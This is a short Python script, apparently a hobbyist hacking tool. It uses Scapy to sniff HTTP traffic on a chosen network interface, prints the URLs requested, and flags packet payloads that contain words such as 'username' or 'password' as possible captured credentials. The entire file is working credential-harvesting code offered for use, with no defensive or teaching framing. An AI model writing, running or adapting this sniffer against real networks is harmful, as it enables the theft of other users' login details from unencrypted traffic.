# Only works with http websites, will crash if the website uses https or will simply wont show it

import scapy.all as scapy,argparse
from scapy.layers import http
from termcolor import colored


def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def url_extractor(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url.decode('utf-8')

def password_extractor(packet):
    load = packet[scapy.Raw].load
    keywords = ['username','uname','pass','password','user']
    for word in keywords:
        if word in load.decode('utf-8'):
            return load.decode('utf-8')
               

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #we used http here because scapy does'nt have http layer 
        try:
            print(url_extractor(packet))
        except:
            print("Cannot decode")
        if packet.haslayer(scapy.Raw):
            try:    
                load = password_extractor(packet) 
                print(colored(f"\n\n[+] Possible username&password >> {str(load)} \n\n",'red'))
            except:
                print("Cannot decode")

def main():
    parser = argparse.ArgumentParser(description="Simple Http username,password and url sniffer")
    parser.add_argument('--interface',help="The interfave to sniff on")
    option = parser.parse_args()
    sniff(option.interface)

if __name__ == '__main__':
    main()